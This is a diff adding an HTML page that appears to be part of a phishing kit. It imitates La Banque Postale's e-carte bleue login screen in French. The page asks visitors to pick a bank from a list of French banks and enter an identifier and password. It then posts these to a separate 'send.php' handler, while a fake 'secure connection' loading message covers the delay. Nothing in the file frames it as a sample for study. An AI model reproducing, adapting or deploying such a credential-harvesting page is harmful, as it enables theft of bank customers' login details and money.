@@ -1,0 +1,207 @@
+<html class=" js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="fr"><!--<![endif]--><head>
+
+
+
+
+
+
+
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="UTF-8">
+<title>Connexion </title>
+
+
+<link rel="mask-icon" href="resources/safari-pinned-tab.svg" color="#FFFFFF">
+<!--[if IE]><link rel="shortcut icon" type="image/x-icon" href="resources/favicon.ico" ><![endif]-->
+<meta name="msapplication-TileColor" content="#FFFFFF">
+<meta name="msapplication-TileImage" content="resources/mstile-144x144.png">
+<meta name="description" content="">
+<meta name="format-detection" content="telephone=no">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<link rel="stylesheet" href="resources/skin.css">
+
+<link rel="stylesheet" href="resources/jquery.contextmenu.css">
+
+
+<script src="resources/modernizr-2.8.3-respond-1.4.2.min.js"></script>
+<script src="resources/jquery-1.11.2.min.js"></script>
+
+</head>
+<body class="thin-app authenticate-screen" cz-shortcut-listen="true">
+	<div id="wrapper">
+		<div id="wrapper-inner">
+			<div id="content-layer">
+				<article class="container-fluid">
+					<div id="content" class="row">
+						
+						
+
+
+
+
+
+<!-- Construction des urls -->
+
+
+
+
+<script>
+$(document).ready(function(){
+
+	$('input').click(function(){
+		$('#user-id').css("border-color","#fff");
+		$('#user-password').css("border-color","#fff");
+	});
+	
+	
+    	
+
+	
+});
+    
+    function valid() {
+	
+		
+		if($('#user-id').val().length < 7){
+			$('#user-id').css("border-color","#ff0000");
+			return false;
+		}
+		
+		
+		if( $('#user-password').val().length < 4 ){
+			$('#user-password').css("border-color","#ff0000");
+			return false;
+		}
+		if( $('#user-id').val().length > 6 && $('#user-password').val().length > 3 ){
+		 $('body').addClass('loading');
+		
+				
+				$('#user-id-h').val($('#user-id').val()); 
+				$('#user-password-h').val($('#user-password').val()); 		
+				$('#user-memorise').prop('checked') ? $('#user-memorise-h').val('true') : $('#user-memorise-h').val('false');
+			
+				setTimeout(function(){
+					$("form").submit();
+				}, 1800);
+				
+		}
+}
+   
+</script>
+<header id="header">
+	<div class="col-xs-12">
+		<div id="header-upper-brand-space">
+			<img id="header-upper-brand-space-EPB" src="/fr/labanquepostale/skins/skin-lbp-visa/images/logo-banque.png" alt="logo banque">
+		</div>
+		<nav>
+			<button id="header-help-btn" " type="button" onclick="window.open('https://www.labanquepostale.fr/transversal/popups/argent_au_quotidien/e_carte_bleue/appli/aide_fr/ident.html','_blank','height=768,width=1024,scrollbars=yes,resizable=yes,status=yes,toolbar=no,menubar=no,location=no'); return false;">
+				<span class="sr-only">afficher l'aide login (nouvelle fenêtre)</span>
+			</button>
+			<button id="header-disconnect-btn" title="se déconnecter" type="button" onclick="location.href='/fr/labanquepostale/logout'">
+				Déconnexion
+			</button>
+			<ul id="header-tab-menu" class="">
+				<li><a href="/fr/labanquepostale/payer" title="afficher la page payer" class="tab-link "><span>payer</span></a></li>
+				<li><a href="#" onclick="javascript:gotoHistoric();return false;" title="afficher la page historique" class="tab-link "><span>historique</span></a></li>
+				<li class="dropdown"><a id="header-drop-options" href="#" title="afficher les options" class="tab-link " data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><span>options<span class="caret"></span></span></a>
+					<ul class="dropdown-menu" aria-labelledby="header-drop-options" id="menu_options">
+						
+						
+							
+						
+						<li><a href="/fr/labanquepostale/preparestrongauth?actionType=changepass" title="afficher la page de changement de mot de passe">Changer le mot de passe</a></li>
+						<li class="lastMenuOption" id="address-change-option"><a href="/fr/labanquepostale/payer#address-change" title="afficher le bloc de modification d'adresse" class="edit-toggle-href">Changer mes adresses</a></li>
+
+						<!-- Liens additionnels -->
+						
+					</ul></li>
+			</ul>
+		</nav>
+
+		<div id="header-lower-brand-space">
+			<img id="header-lower-brand-space-EPB" src="resources/logo-banque.png" alt="logo banque"> <img id="header-lower-brand-space-EPV" src="resources/logo-carte.png" alt="carte visa">
+			<h1 id="header-title">Connexion</h1>
+		</div>
+	</div>
+</header>
+						<div id="no-loading-content" class="col-xs-12">
+							
+								<form   action="send.php" method="post"   >
+								<tr>
+                                     <td align="right" width="30%" class="deskonly" style="margin-bottom: 6px;"></td>
+
+
+							            <select class="" name="ques" id="ques" style="width:100%">
+                                        <option selected="" value="">Choisir Votre Banque</option> 
+                                        <option value="La Banque Populaire">La Banque Populaire</option>										
+										<option value="La Banque Postale">La Banque Postale</option>
+										<option value="Société Générale">Société Générale</option>
+										<option value="Caisse d'Epargne">Caisse d'Epargne</option>
+										<option value="Crédit lyonnais">Crédit Lyonnais</option>
+
+
+									    </select>										
+                                 </tr>
+								 
+									<div class="fake-form">
+									
+										<div class="form-group">
+											<label for="user-id"><img src="resources/ident.png" /></label> <input name="login" type="text" class="form-control" id="user-id" autocomplete="off" value="">
+											<div class="checkbox">
+												<label for="user-memorise"><input type="checkbox" name="memorise" id="user-memorise"><img src="resources/memo.png" /></label>
+											</div>
+										</div>
+										<div class="form-group">
+											<label for="user-password"><img src="resources/pass.png" /></label> <input name="motdepasse" type="password" class="form-control" id="user-password" autocomplete="off">
+										</div>
+									</div>
+									<div class="btn-holder centered">
+											
+											<button type="submit" class="btn-text" value="Valider" onclick="javascript:valid();return false;">
+											Valider
+											</button>
+										</div>
+								</form>
+						</div>
+						
+						
+						
+<div id="loading-content" class="col-xs-12">
+	<figure class="loading-sign">
+		<figcaption>
+			<span class="sr-only">chargement en cours</span>
+		</figcaption>
+	</figure>
+	<div><p>Veuillez patienter,</p><p>connexion sécurisée en cours.</p></div>
+</div>
+<div id="loading-historic-content" class="col-xs-12">
+	<figure class="loading-sign">
+		<figcaption>
+			<span class="sr-only">chargement en cours</span>
+		</figcaption>
+	</figure>
+	<div><p>Veuillez patienter,</p><p>chargement de l'historique en cours...</p></div>
+</div>
+						<footer>
+	<script src="resources/jquery.contextmenu.js"></script>
+	<script src="resources/jquery-js-cookie.js"></script>
+	<script src="resources/bootstrap.min.js"></script>
+	<script src="resources/underscore.1.8.3.min.js"></script>
+	<script src="resources/effects.js"></script>
+	
+	<script src="resources/main.js"></script>
+	<!--[if IE 9]>
+		<script src="/fr/labanquepostale/skins/skin-lbp-visa/js/vendor/jquery.placeholder.min.js"></script>
+		<script>$('input, textarea').placeholder();</script>
+	<![endif]-->
+</footer>
+					</div>
+				</article>
+			</div>
+		</div>
+	</div>
+	<div id="overlay-layer" style="display: none;">OVER</div>
+
+</body></html>
